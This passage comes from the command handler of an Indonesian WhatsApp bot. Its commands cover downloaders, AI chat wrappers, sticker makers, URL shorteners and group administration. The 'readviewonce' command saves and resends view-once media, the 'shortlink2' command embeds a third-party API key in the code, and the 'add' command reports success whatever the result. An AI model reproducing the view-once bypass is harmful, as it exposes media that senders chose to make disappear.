      response.data.on('end', async () => {
        await Rulzz.sendMessage(m.chat, {
          document: Buffer.concat(chunks),
          fileName: fileName,
          mimetype: fileType || 'application/octet-stream',
          caption: `📦 *Nama:* ${fileName}\n📁 *Ukuran:* ${fileSize}\n📆 *Tanggal Upload:* ${uploadDate}\n🌐 *Sumber:* MediaFire`
        }, { quoted: m });
      });
    }

  } catch (err) {
    await Rulzz.sendMessage(m.chat, {react: {text: '', key: m.key}})
    console.error(err);
    return m.reply(`❌ Gagal mengunduh file MediaFire:\n${err.message}`);
  }
 }
break

//================================================================================

case "tiktokmp3": case "ttmp3": {
if (!text) return m.reply(example("linknya"))
if (!text.startsWith('https://')) return m.reply("Link tautan tidak valid")
await Rulzz.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
await tiktokDl(text).then(async (res) => {
if (!res.status) return m.reply("Error! Result Not Found")
await Rulzz.sendMessage(m.chat, {audio: {url: res.music_info.url}, mimetype: "audio/mpeg"}, {quoted: m})
await Rulzz.sendMessage(m.chat, {react: {text: '', key: m.key}})
}).catch((e) => m.reply("Error! Result Not Found"))
}
break

//================================================================================

case "instagram": case "igdl": case "ig": {
  if (!text) return m.reply(example("linknya"));
  if (!text.startsWith('https://instagram.com') && !text.startsWith('https://www.instagram.com')){ return m.reply("❌ Link harus dari Instagram (https://instagram.com)")};

    m.reply("📥 Memproses download video...");
    try {
        let anu = await fetchJson(`https://api.diioffc.web.id/api/download/instagram?url=${text}`);
        if (anu.status && anu.result && anu.result.length > 0) {
            let videoUrl = anu.result[0].url;

            if (videoUrl) {
                await Rulzz.sendFileUrl(m.chat, videoUrl, "✅ Download Video Instagram", m);
            } else {
                return m.reply("❌ Video tidak ditemukan.");
            }
        } else {
            return m.reply("❌ Error! Result tidak ditemukan.");
        }
    } catch (e) {
        console.error(e);
        return m.reply("⚠️ Terjadi kesalahan saat memproses permintaan.");
    }
}
break

case "instagrammp3": case "igdlmp3": case "igmp3": {
  if (!text) return m.reply(example("linknya"));
  if (!text.startsWith('https://instagram.com') && !text.startsWith('https://www.instagram.com')){ 
    return m.reply("❌ Link harus dari Instagram (https://instagram.com)")
  };

  // Tentukan jenis proses berdasarkan command
  const isMp3 = command === "igmp3";
  
  m.reply(isMp3 ? "🎵 Memproses ekstrak audio MP3..." : "📥 Memproses download video...");
  
  try {
    let anu = await fetchJson(`https://api.diioffc.web.id/api/download/instagram?url=${text}`);
    
    if (anu.status && anu.result && anu.result.length > 0) {
      let videoUrl = anu.result[0].url;
      
      if (!videoUrl) {
        return m.reply("❌ Video tidak ditemukan.");
      }
      
      // Jika perintah adalah igmp3, ekstrak audio
      if (isMp3) {
        m.reply("⏳ Sedang mengekstrak audio...");
        
        // Download video terlebih dahulu
        const videoResponse = await fetch(videoUrl);
        const videoArrayBuffer = await videoResponse.arrayBuffer();
        const videoBuffer = Buffer.from(videoArrayBuffer);
        
        const tempDir = './source/media';
        if (!fs.existsSync(tempDir)) {
          fs.mkdirSync(tempDir);
        }
        
        const tempVideoPath = path.join(tempDir, `temp_video_${Date.now()}.mp4`);
        const tempAudioPath = path.join(tempDir, `audio_${Date.now()}.mp3`);
        
        fs.writeFileSync(tempVideoPath, videoBuffer);
        
        // Ekstrak audio menggunakan ffmpeg
        const { spawn } = require('child_process');
        const ffmpeg = spawn('ffmpeg', [
          '-i', tempVideoPath,
          '-q:a', '0',
          '-map', 'a',
          '-y',
          tempAudioPath
        ]);
        
        // Tunggu proses selesai
        await new Promise((resolve, reject) => {
          ffmpeg.on('close', (code) => {
            if (code === 0) {
              resolve();
            } else {
              reject(new Error(`FFmpeg exited with code ${code}`));
            }
          });
          
          ffmpeg.on('error', reject);
        });
        
        // Baca file audio hasil ekstraksi
        const audioBuffer = fs.readFileSync(tempAudioPath);
        
        // Hapus file temporary
        fs.unlinkSync(tempVideoPath);
        fs.unlinkSync(tempAudioPath);
        
        // Kirim audio sebagai MP3
        await Rulzz.sendMessage(m.chat, { 
          audio: audioBuffer, 
          mimetype: 'audio/mpeg',
          fileName: 'instagram_audio.mp3'
        }, { quoted: m });
        
        m.reply("✅ Audio MP3 berhasil diekstrak!");
        
      } else {
        // Kirim video seperti biasa
        await Rulzz.sendFileUrl(m.chat, videoUrl, "✅ Download Video Instagram", m);
      }
      
    } else {
      return m.reply("❌ Error! Result tidak ditemukan.");
    }
  } catch (e) {
    console.error(e);
    return m.reply("⚠️ Terjadi kesalahan saat memproses permintaan.");
  }
}
break

//================================================================================

case "gitclone": {
if (!text) return m.reply(example("https://github.com/RulzzML/RulzXD"))
let regex = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
if (!regex.test(text)) return m.reply("Link tautan tidak valid")
try {
    let [, user, repo] = args[0].match(regex) || []
    repo = repo.replace(/.git$/, '')
    let url = `https://api.github.com/repos/${user}/${repo}/zipball`
    let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
    Rulzz.sendMessage(m.chat, { document: { url: url }, mimetype: 'application/zip', fileName: `${filename}`}, { quoted : m })
} catch (e) {
await m.reply(`Repositori Tidak Ditemukan`)
}}
break

//================================================================================

case "tt": case "tiktok": {
  if (!text) return m.reply(example("url"))
  if (!text.startsWith("https://vt.tiktok.com/")) return m.reply(example("url tiktoknya"))

  await Rulzz.sendMessage(m.chat, { react: { text: '🕖', key: m.key } })

  try {
    const { data: json } = await axios.get(
      "https://api.rulzzofficial.my.id/api/download/tiktokdl",
      {
        params: {
          apikey: `${global.apikeyRulzXD}`,
          url: text
        },
        headers: {
          "User-Agent": "Mozilla/5.0",
          "Accept": "application/json"
        },
        timeout: 15000
      }
    )

    if (!json.status) return m.reply("Error!")

    const data = json.data

    // ============ VIDEO ============
    if (data.video_nowm) {
      await Rulzz.sendMessage(
        m.chat,
        {
          video: { url: data.video_nowm },
          mimetype: "video/mp4",
          caption: "*Tiktok Downloader ✅*"
        },
        { quoted: m }
      )

    // ============ SLIDE ============
    } else if (Array.isArray(data.slides) && data.slides.length > 0) {
      let cards = []
      let i = 0

      for (let img of data.slides) {
        let media = await prepareWAMessageMedia(
          { image: { url: img } },
          { upload: Rulzz.waUploadToServer }
        )

        cards.push({
          header: proto.Message.InteractiveMessage.Header.fromObject({
            title: `Foto Slide Ke *${++i}*`,
            hasMediaAttachment: true,
            ...media
          }),
          nativeFlowMessage:
            proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
              buttons: [{
                name: "cta_url",
                buttonParamsJson: JSON.stringify({
                  display_text: "Link Tautan Foto",
                  url: img,
                  merchant_url: "https://www.google.com"
                })
              }]
            })
        })
      }

      const msg = await generateWAMessageFromContent(
        m.chat,
        {
          viewOnceMessageV2Extension: {
            message: {
              messageContextInfo: {
                deviceListMetadata: {},
                deviceListMetadataVersion: 2
              },
              interactiveMessage:
                proto.Message.InteractiveMessage.fromObject({
                  body:
                    proto.Message.InteractiveMessage.Body.fromObject({
                      text: "*Tiktok Slide Downloader ✅*"
                    }),
                  carouselMessage:
                    proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                      cards
                    })
                })
            }
          }
        },
        { userJid: m.sender, quoted: m }
      )

      await Rulzz.relayMessage(m.chat, msg.message, {
        messageId: msg.key.id
      })

    } else {
      m.reply("Media tidak ditemukan")
    }

  } catch (err) {
    console.log("Error:", err?.response?.data || err.message)
    m.reply("Downloader error")
  }

  await Rulzz.sendMessage(m.chat, { react: { text: '', key: m.key } })
}
break

//================================================================================

case "tiktoksearch": case "ttsearch": case "tts": {
if (!text) return m.reply(example("jj epep terbaru"))
await Rulzz.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
await fetch(`https://api.diioffc.web.id/api/search/tiktok?query=${text}`).then(async (res) => {
let response = await res.json()
let result = response.result[Math.floor(Math.random() * response.result.length)]
Rulzz.sendMessage(m.chat, { video: { url: result.media.no_watermark }, mimetype: 'video/mp4', caption: result.title }, { quoted : m })
setTimeout(() => {
Rulzz.sendMessage(m.chat, { audio: { url: result.media.audio }, mimetype: "audio/mpeg", contextInfo: { externalAdReply: { thumbnailUrl: result.thumbnail, title: result.music.title, body: result.music.author, sourceUrl: null, renderLargerThumbnail: true, mediaType: 1}}}, { quoted: m })
}, 3000)
}).catch(err => m.reply('API sedang eror.'))
await Rulzz.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

case "get": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("https://example.com"))
let data = await fetchJson(text)
m.reply(JSON.stringify(data, null, 2))
}
break

//================================================================================

case "ssweb": {
if (!text) return m.reply(example("https://example.com"))
if (!isUrl(text)) return m.reply(example("https://example.com"))
await Rulzz.sendMessage(m.chat, {react: {text: '⏱️', key: m.key}})
const {
  screenshotV1, 
  screenshotV2,
  screenshotV3 
} = require('getscreenshot.js')
var data = await screenshotV2(text)
await Rulzz.sendMessage(m.chat, {react: {text: '', key: m.key}})
await Rulzz.sendMessage(m.chat, { image: data, mimetype: "image/png"}, {quoted: m})
}
break

//================================================================================

case "shortlink": case "shorturl": {
if (!text) return m.reply(example("https://example.com"))
if (!isUrl(text)) return m.reply(example("https://example.com"))
var res = await axios.get('https://tinyurl.com/api-create.php?url='+encodeURIComponent(text))
var link = `
* *Shortlink by tinyurl.com*
${res.data.toString()}
`
return m.reply(link)
}
break


case "shortlink2": case "shortlinkdl": {
if (!text) return m.reply(example("https://example.com"))
if (!isUrl(text)) return m.reply(example("https://example.com"))
var a = await fetch(`https://moneyblink.com/st/?api=524de9dbd18357810a9e6b76810ace32d81a7d5f&url=${text}`)
await Rulzz.sendMessage(m.chat, {text: a.url}, {quoted: m})
}
break

//================================================================================

case "idgc": case "cekidgc": {
if (!m.isGroup) return Reply(mess.group)
await Rulzz.sendMessage(m.chat, { react: { text: "🕔", key: m.key } });
m.reply(m.chat)
await Rulzz.sendMessage(m.chat, { react: { text: "", key: m.key } });
}
break

//================================================================================

case "listgc": case "listgrup": {
if (!isCreator) return
let teks = `\n *乂 List all group chat*\n`
let a = await Rulzz.groupFetchAllParticipating()
let gc = Object.values(a)
teks += `\n* *Total group :* ${gc.length}\n`
for (const u of gc) {
teks += `\n* *ID :* ${u.id}
* *Nama :* ${u.subject}
* *Member :* ${u.participants.length}
* *Status :* ${u.announce == false ? "Terbuka": "Hanya Admin"}
* *Pembuat :* ${u?.subjectOwner ? u?.subjectOwner.split("@")[0] : "Sudah Keluar"}\n`
}
return m.reply(teks)
}
break

//================================================================================

case "cekidch": case "idch": {
  if (!text) return m.reply(example("link chnya"))
  if (!text.includes("https://whatsapp.com/channel/")) return m.reply("Link tautan tidak valid")

  try {
    const result = text.split('https://whatsapp.com/channel/')[1]
    const res = await Rulzz.newsletterMetadata("invite", result)

    const teksnya = `*Cek ID Channel By RulzXD*\n
    • *Nama:* ${res.name}
    • *Pengikut:* ${res.subscribers}
    • *ID:* ${res.id}
    • *Status:* ${res.state}
    • *Verified:* ${res.verification === "VERIFIED" ? "✅ Terverifikasi" : "❌ Tidak Terverifikasi"}`

await Rulzz.sendMessage(m.chat, {
  interactiveMessage: {
    title: teksnya,
    nativeFlowMessage: {
      buttons: [
        {
          name: 'cta_copy',
          buttonParamsJson: JSON.stringify({
            display_text: '📋 Salin ID CH',
            copy_code: res.id
          })
        }
      ]
    }
  }
}, { quoted: m })

  } catch (err) {
    console.error(err)
    m.reply("❌ Terjadi kesalahan saat mengambil data channel.")
  }
}
break

//================================================================================
case "pin":
case "pinterest": {
  if (!text) return m.reply(example("kucing lucu"));

  await Rulzz.sendMessage(m.chat, { react: { text: "🔎", key: m.key } });

  try {
    const url = `https://api.siputzx.my.id/api/s/pinterest?query=${encodeURIComponent(text)}&type=image`;
    const res = await fetch(url, {
      headers: { "User-Agent": "Mozilla/5.0", "accept": "*/*" }
    });

    if (!res.ok) throw new Error(`API error: ${res.status}`);
    const json = await res.json();

    if (!json.status || !json.data || json.data.length === 0) {
      return m.reply("Maaf, tidak ditemukan hasil.");
    }

    const pins = json.data;
    const limitedPins = pins.slice(0, 10);
    const carouselCards = [];

    for (let item of limitedPins) {
      let url = item.image_url;

      // ambil buffer biar gak kena error 515 / toString
      const buffer = await fetch(url).then((res) => res.arrayBuffer());

      const imgMedia = await prepareWAMessageMedia(
        { image: Buffer.from(buffer) },
        { upload: Rulzz.waUploadToServer }
      );

      carouselCards.push({
        header: proto.Message.InteractiveMessage.Header.fromObject({
          hasMediaAttachment: true,
          ...imgMedia
        }),
        body: proto.Message.InteractiveMessage.Body.fromObject({
          text: item.pin
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
          buttons: [
            {
              name: "cta_url",
              buttonParamsJson: JSON.stringify({
                display_text: "🔗 Lihat di Pinterest",
                url: item.pin,
                merchant_url: item.pin
              })
            }
          ]
        })
      });
    }

    const carouselMsg = await generateWAMessageFromContent(
      m.chat,
      {
        viewOnceMessageV2Extension: {
          message: {
            messageContextInfo: {
              deviceListMetadata: {},
              deviceListMetadataVersion: 2
            },
            interactiveMessage: proto.Message.InteractiveMessage.fromObject({
              body: proto.Message.InteractiveMessage.Body.fromObject({
                text: `Hasil pencarian Pinterest untuk *${text}*\n\nGeser untuk melihat lebih banyak foto.`
              }),
              carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                cards: carouselCards
              })
            })
          }
        }
      },
      { userJid: m.sender, quoted: m }
    );

    await Rulzz.relayMessage(m.chat, carouselMsg.message, {
      messageId: carouselMsg.key.id
    });

    await Rulzz.sendMessage(m.chat, { react: { text: "", key: m.key } });

  } catch (e) {
    console.error(e);
    m.reply("❌ Terjadi error saat mengambil data Pinterest.");
  }
}
break

//=============================================================================

case "ai": case "gpt": case "openai": {
  const prompt = `Namamu adalah RulzXD AI, kamu di ciptakan oleh seseorang bernama Rulzz OfficiaL. Gaya bicaramu harus seperti cowok keren tapi sopan — gak alay, gak jamet, gak jomok. Gunakan kata seperti gw, lu, bro, atau kak tergantung konteks pembicaraan. Tunjukkan ekspresi lewat emoji secukupnya, misalnya 😎🔥💬 buat gaya santai.`;
  let talk = text ? `Jawab dalam bahasa Indonesia: ${text}` : "Hai, jawab dalam bahasa Indonesia.";
  
  try {
    let res = await fetchJson(`https://api.siputzx.my.id/api/ai/gpt3?prompt=${encodeURIComponent(
      prompt
    )}&content=${encodeURIComponent(talk)}`);
    await m.reply(res.data);
  } catch (e) {
    m.reply("Wah, Rest API yang digunakan owner sedang eror nih!");
    console.log("API chatgpt yang digunakan error.", e);
  }
}
break

//================================================================================

case "simi": case "simsimi": case "simisimi": {
  let talk = `Jawab dalam bahasa Indonesia: ${text}`;
  try {
    let res = await fetchJson(`https://api.siputzx.my.id/api/ai/llama33?prompt=Kamu adalah simi&text=Jadilah AI yang emosi sedikit tapi tidak kasar, ${encodeURIComponent(talk)}`);
    await m.reply(res.data || "⚠️ Tidak ada respon dari AI.");
  } catch (e) {
    m.reply("Wah, Rest API yang digunakan owner sedang eror nih!");
    console.log("Api simsimi yang digunakan error:", e);
  }
}
break

//================================================================================

case "brat": {
if (!isCreator && !isPremium) return m.reply(mess.prem)
if (!text) return m.reply(example('teksnya'))
let brat = `https://api.rulzzofficial.my.id/api/tools/brat?apikey=${global.apikeyRulzXD}&text=${encodeURIComponent(text)}`
let response = await axios.get(brat, { responseType: "arraybuffer" })
let videoBuffer = response.data;
try {
await Rulzz.sendMessage(m.chat, { react: { text: "🕔", key: m.key } });
await Rulzz.sendAsSticker(m.chat, videoBuffer, m, {packname: global.packname});
await Rulzz.sendMessage(m.chat, { react: { text: "", key: m.key } });
} catch (error) {
    console.error("Terjadi kesalahan saat membuat atau mengirim stiker brat:", error); 
    m.reply("Terjadi kesalahan saat membuat atau mengirim stiker brat. Silakan coba lagi nanti.");
}
}
break

case 'iqc': {
    if (!text) {
        return m.reply(`❌ *Format salah!*
 
*Cara pakai:*
${prefix}iqc teks|waktu
 
*Contoh Basic:*
${prefix}iqc kalau gw sih bodo amat 😂|23.13
 
*Dengan Options:*
${prefix}iqc teks|waktu|baterai|operator|wifi|timebar
 
*Contoh Lengkap:*
${prefix}iqc Hello World|15:30|85|true|true|true
 
*Keterangan:*
• Baterai: 0-100 (default: hidden)
• Operator: true/false (default: false)
• Wifi: true/false (default: false)
• Timebar: true/false (default: false)`);
    }
    
    let quoteText, quoteTime, battery, operator, wifi, timebar;
    
    if (text.includes('|')) {
        const parts = text.split('|').map(p => p.trim());
        quoteText = parts[0];
        quoteTime = parts[1];
        battery = parts[2] || null;
        operator = parts[3] || null;
        wifi = parts[4] || null;
        timebar = parts[5] || null;
    } else {
        quoteText = text;
        const now = new Date();
        quoteTime = `${String(now.getHours()).padStart(2, '0')}.${String(now.getMinutes()).padStart(2, '0')}`;
        battery = null;
        operator = null;
        wifi = null;
        timebar = null;
    }
    
    if (!quoteText) {
        return reply('❌ Teks quote tidak boleh kosong!');
    }
    
    if (quoteText.length > 200) {
        return reply('❌ Teks terlalu panjang! Maksimal 200 karakter.');
    }
    
    const timeRegex = /^([0-1]?[0-9]|2[0-3])[:.]([0-5][0-9])$/;
    if (!timeRegex.test(quoteTime)) {
        return reply('❌ Format waktu salah! Gunakan format HH.MM atau HH:MM\nContoh: 23.13 atau 12:30');
    }
    
    quoteTime = quoteTime.replace(':', '.');
    
    try {
        const options = {
            baterai: battery ? [true, battery.toString()] : [false, "0"],
            operator: operator ? (operator.toLowerCase() === 'true' || operator === '1') : false,
            wifi: wifi ? (wifi.toLowerCase() === 'true' || wifi === '1') : false,
            timebar: timebar ? (timebar.toLowerCase() === 'true' || timebar === '1') : false
        };
        
        const { generateIQC } = require('iqc-canvas');
        const result = await generateIQC(quoteText, quoteTime, options);
        
        if (!result.success) {
            throw new Error('Gagal generate quote');
        }
        
        let caption = `✅ *QUOTE BERHASIL DIBUAT*\n\n`;
        caption += `📝 *Teks:* ${quoteText}\n`;
        caption += `⏰ *Waktu:* ${quoteTime}\n`;
        
        if (battery) {
            caption += `🔋 *Baterai:* ${battery}%\n`;
        }
        if (operator && options.operator) {
            caption += `📡 *Operator:* Aktif\n`;
        }
        if (wifi && options.wifi) {
            caption += `📶 *WiFi:* Aktif\n`;
        }
        if (timebar && options.timebar) {
            caption += `⏱️ *Timebar:* Aktif\n`;
        }
        
        caption += `\n_${result.message}_`;
        
        await Rulzz.sendMessage(m.chat, {
            image: result.image,
            caption: caption
        }, { quoted: m });
        
    } catch (error) {
        console.error('Error generate quote:', error);
        
        let errorMsg = '❌ *Gagal membuat quote!*\n\n';
        
        if (error.message.includes('Cannot find module')) {
            errorMsg += '📦 *Module iqc-canvas belum terinstall*\n\n';
            errorMsg += '*Install dengan:*\n```npm install iqc-canvas```';
        } else if (error.message.includes('generateIQC')) {
            errorMsg += '⚠️ Fungsi generateIQC belum tersedia\nPastikan module iqc-canvas sudah terinstall';
        } else if (error.message.includes('canvas') || error.message.includes('image')) {
            errorMsg += '🖼️ Gagal memproses gambar\nPastikan dependencies canvas terinstall';
        } else {
            errorMsg += `Error: ${error.message}`;
        }
        
        return m.reply(errorMsg);
    }
}
break;

//================================================================================

case "bratvid": case "bratvideo": {
if (!isCreator && !isPremium) return m.reply(mess.prem);
if (!text) return m.reply(example('teksnya'));
  try {
     await Rulzz.sendMessage(m.chat, { react: { text: "🕔", key: m.key } });

     const bratUrl = `https://api.rulzzofficial.my.id/api/tools/bratvid?apikey=${global.apikeyRulzXD}&text=${encodeURIComponent(text)}`;
     const response = await axios.get(bratUrl, { responseType: "arraybuffer" });
     const videoBuffer = response.data;

     await Rulzz.sendAsSticker(m.chat, videoBuffer, m, {
         packname: global.packname,
     });

     await Rulzz.sendMessage(m.chat, { react: { text: "", key: m.key } });
  } catch (err) {
     console.error("Error creating brat sticker:", err);
     m.reply("Terjadi kesalahan saat membuat atau mengirim stiker brat. Silakan coba lagi nanti.");
  }
}
break

//================================================================================

case "qc": {
if (!text) return m.reply(example('teksnya'))
let warna = ["#000000", "#ff2414", "#22b4f2", "#eb13f2"]
var ppuser
try {
ppuser = await Rulzz.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://telegra.ph/file/a059a6a734ed202c879d3.jpg'
}
const json = {
  "type": "quote",
  "format": "png",
  "backgroundColor": "#000000",
  "width": 812,
  "height": 968,
  "scale": 2,
  "messages": [
    {
      "entities": [],
      "avatar": true,
      "from": {
        "id": 1,
        "name": m.pushName,
        "photo": {
          "url": ppuser
        }
      },
      "text": text,
      "replyMessage": {}
    }
  ]
};
        const response = axios.post('https://bot.lyo.su/quote/generate', json, {
        headers: {'Content-Type': 'application/json'}
}).then(async (res) => {
    const buffer = Buffer.from(res.data.result.image, 'base64')
    let tempnya = "./library/database/sampah/"+m.sender+".png"
await fs.writeFile(tempnya, buffer, async (err) => {
if (err) return m.reply("Error")
await Rulzz.sendAsSticker(m.chat, tempnya, m, {packname: global.packname})
await fs.unlinkSync(`${tempnya}`)
})
})
}
break

//================================================================================

case "s": case "sticker": case "stiker": {
if (!/image|video/gi.test(mime)) return m.reply(example("dengan kirim media"))
if (/video/gi.test(mime) && qmsg.seconds > 15) return m.reply("Durasi vidio maksimal 15 detik!")
var image = await Rulzz.downloadAndSaveMediaMessage(qmsg)
await Rulzz.sendAsSticker(m.chat, image, m, {packname: global.packname})
await fs.unlinkSync(image)
}
break

//================================================================================

case "swm": case "stickerwm": case "stikerwm": case "wm": {
if (!text) return m.reply(example("namamu dengan kirim media"))
if (!/image|video/gi.test(mime)) return m.reply(example("namamu dengan kirim media"))
if (/video/gi.test(mime) && qmsg.seconds > 15) return m.reply("Durasi vidio maksimal 15 detik!")
var image = await Rulzz.downloadAndSaveMediaMessage(qmsg)
await Rulzz.sendAsSticker(m.chat, image, m, {packname: text})
await fs.unlinkSync(image)
}
break

//================================================================================


case "rvo": case "readviewonce": {
 if (!isCreator && !isPremium) return m.reply(mess.prem);
 if (!m.quoted) return m.reply(example("dengan reply pesannya"));

 let msg = m.quoted.message;
 let type = Object.keys(msg)[0];
    
 if (!msg[type].viewOnce) return m.reply("Pesan itu bukan view once!");
    
 let media = await downloadContentFromMessage(
    msg[type],
    type === 'imageMessage' ? 'image' :
    type === 'videoMessage' ? 'video' :
    'audio'
  );

 let buffer = Buffer.from([]);
 for await (const chunk of media) {
     buffer = Buffer.concat([buffer, chunk]);
  }

 if (/video/.test(type)) {
  return Rulzz.sendMessage(m.chat, {
       video: buffer,
       caption: "",
     }, {quoted: m});
  } else if (/image/.test(type)) {
  return Rulzz.sendMessage(m.chat, {
       image: buffer,
       caption: "",
     }, {quoted: m});
  } else if (/audio/.test(type)) {
  return Rulzz.sendMessage(m.chat, {
       audio: buffer,
       mimetype: "audio/mpeg",
       ptt: true
     }, {quoted: m});
  } 
}
break

//================================================================================

case "tourl": {
if (!/image/.test(mime)) return m.reply(example("dengan kirim/reply foto"))
let media = await Rulzz.downloadAndSaveMediaMessage(qmsg)
const { ImageUploadService } = require('node-upload-images')
const service = new ImageUploadService('pixhost.to');
let { directLink } = await service.uploadFromBinary(fs.readFileSync(media), 'foto.png');

let teks = directLink.toString()
await Rulzz.sendMessage(m.chat, {
text: `${teks}`,
footer: "baten",
interactiveButtons: [
            {
                name: 'single_select',
                buttonParamsJson: JSON.stringify({
                    title: 'Click',
                    sections: [
                        {
                            title: 'Title 1',
                            highlight_label: 'Highlight label 1',
                            rows: [
                            { title: "Semua Menu", id: `${prefix}menu` },
                            { title: "Menu Owner", id: `${prefix}buymenu` }
                            ]
                        }
                    ]
                })
            }
        ],
   }, { quoted: m });
await fs.unlinkSync(media)
}
break

//================================================================================

case "tourl2": {
if (!/image/.test(mime)) return m.reply(example("dengan kirim/reply foto"))
let media = await Rulzz.downloadAndSaveMediaMessage(qmsg)
const { ImageUploadService } = require('node-upload-images')
const service = new ImageUploadService('postimages.org');
let { directLink } = await service.uploadFromBinary(fs.readFileSync(media), 'Rulzz OfficiaL.png');
let teks = directLink.toString()
await Rulzz.sendMessage(m.chat, {text: `*Berikut link urlnya :*\n${teks}`}, {quoted: m})
await fs.unlinkSync(media)
}
break

//================================================================================

case "tr": case "translate": {
let language
let teks
let defaultLang = "en"
if (text || m.quoted) {
let translate = require('translate-google-api')
if (text && !m.quoted) {
if (args.length < 2) return m.reply(example("id good night"))
language = args[0]
teks = text.split(" ").slice(1).join(' ')
} else if (m.quoted) {
if (!text) return m.reply(example("id good night"))
if (args.length < 1) return m.reply(example("id good night"))
if (!m.quoted.text) return m.reply(example("id good night"))
language = args[0]
teks = m.quoted.text
}
let result
try {
result = await translate(`${teks}`, {to: language})
} catch (e) {
result = await translate(`${teks}`, {to: defaultLang})
} finally {
m.reply(result[0])
}
} else {
return m.reply(example("id good night"))
}}
break

//================================================================================

case "tohd": case "hd": {
 if (!/image/.test(mime)) return m.reply(example("dengan kirim/reply foto"))
  try {
    await Rulzz.sendMessage(m.chat, { react: { text: '🕧', key: m.key } })

  let foto = await Rulzz.downloadAndSaveMediaMessage(qmsg)
  let buffer = await fs.readFileSync(foto)

  let result = await remini(buffer, "enhance")

  await Rulzz.sendMessage(m.chat, { image: result }, { quoted: m })

  await fs.unlinkSync(foto)

  await Rulzz.sendMessage(m.chat, { react: { text: '', key: m.key } })
  } catch (err) {
    console.error(err)
    m.reply("❌ Terjadi kesalahan saat memproses gambar.")
  try {
     if (foto && fs.existsSync(foto))
     fs.unlinkSync(foto)
  } catch {}
    await Rulzz.sendMessage(m.chat, { react: { text: '', key: m.key } })
  }
}
break

//================================================================================

case "add": {
 if (!m.isGroup) return Reply(mess.group);
 if (!isCreator && !m.isAdmin) return Reply(mess.admin);
 if (!m.isBotAdmin) return Reply(mess.botAdmin);
 if (!text) return m.reply(example("628xxx"));

 const number = text.replace(/[^0-9]/g, "");
 const jid = number + "@s.whatsapp.net";

 const onWa = await Rulzz.onWhatsApp(number);
 if (!onWa || onWa.length < 1) return m.reply("❌ Nomor tidak terdaftar di WhatsApp.");

 try {
   const res = await Rulzz.groupParticipantsUpdate(m.chat, [jid], "add");

   if (Array.isArray(res) && res.length > 0) {
      const result = res[0];

      if (result?.status === 200) {
            return m.reply(`✅ Berhasil menambahkan @${number} ke dalam grup.`, {
                 mentions: [jid]
              });
          } else {
             return m.reply(`✅ Berhasil menambahkan @${number} ke dalam grup.`, {
                  mentions: [jid]
              });
            }
          } else {
             return m.reply("⚠️ Format respon dari server tidak dikenali.");
        }
    } catch (e) {
       console.error(e);
       return m.reply("❌ Terjadi kesalahan saat menambahkan.");
   }
}
break

//================================================================================

case "kick": case "kik": case "dor": {
 if (!m.isGroup) return Reply(mess.group)
 if (!isCreator && !m.isAdmin) return Reply(mess.admin)
 if (!m.isBotAdmin) return Reply(mess.botAdmin)
 if (text || m.quoted) {
 const input = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : false
 var onWa = await Rulzz.onWhatsApp(input.split("@")[0])
 if (onWa.length < 1) return m.reply("Nomor tidak terdaftar di whatsapp")
 const res = await Rulzz.groupParticipantsUpdate(m.chat, [input], 'remove')
 await m.reply(`Berhasil mengeluarkan ${input.split("@")[0]} dari grup ini`)
 } else {
 return m.reply(example("@tag/reply"))
 }
}
break

//================================================================================

case "leave": {
if (!isCreator) return Reply(mess.owner)
if (!m.isGroup) return Reply(mess.group)
await m.reply("Bot akan keluar dari grup ini..")
await sleep(2000)
await Rulzz.groupLeave(m.chat)
}
break

//================================================================================

case "resetlinkgc": {
if (!isCreator) return Reply(mess.owner)
if (!m.isGroup) return Reply(mess.group)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
await Rulzz.groupRevokeInvite(m.chat)
m.reply("Berhasil mereset link grup ✅")
}
break

//================================================================================

case "tagall": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (!text) return m.reply(example("pesannya"))
let teks = text+"\n\n"
let member = await m.metadata.participants.map(v => v.id).filter(e => e !== botNumber && e !== m.sender)
await member.forEach((e) => {
teks += `@${e.split("@")[0]}\n`
})
await Rulzz.sendMessage(m.chat, {text: teks, mentions: [...member]}, {quoted: m})
}
break

//================================================================================

case "linkgc": {
if (!m.isGroup) return Reply(mess.group)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
const urlGrup = "https://chat.whatsapp.com/" + await Rulzz.groupInviteCode(m.chat)
var teks = `*Link Grup :*\n${urlGrup}`
await Rulzz.sendMessage(m.chat, {text: teks, matchedText: `${urlGrup}`}, {quoted: m})
}
break

//================================================================================

case "ht": case "hidetag": case "h": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("pesannya"))
let member = m.metadata.participants.map(v => v.id)
await Rulzz.sendMessage(m.chat, {text: text, mentions: [...member]}, {quoted: m})
}
break

//================================================================================

case "joingc": case "join": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("linkgcnya"))
if (!text.includes("chat.whatsapp.com")) return m.reply("Link tautan tidak valid")
let result = text.split('https://chat.whatsapp.com/')[1]
let id = await Rulzz.groupAcceptInvite(result)
m.reply(`Berhasil bergabung ke dalam grup ${id}`)
}
break

//================================================================================

case "joinch": case "joinchannel": {
if (!isCreator) return Reply(mess.owner)
if (!text && !m.quoted) return m.reply(example("linkchnya"))
if (!text.includes("https://whatsapp.com/channel/") && !m.quoted.text.includes("https://whatsapp.com/channel/")) return m.reply("Link tautan tidak valid")
let result = m.quoted ? m.quoted.text.split('https://whatsapp.com/channel/')[1] : text.split('https://whatsapp.com/channel/')[1]
let res = await Rulzz.newsletterMetadata("invite", result)
await Rulzz.newsletterFollow(res.id)
m.reply(`
*Berhasil join channel ${res.name}✅*
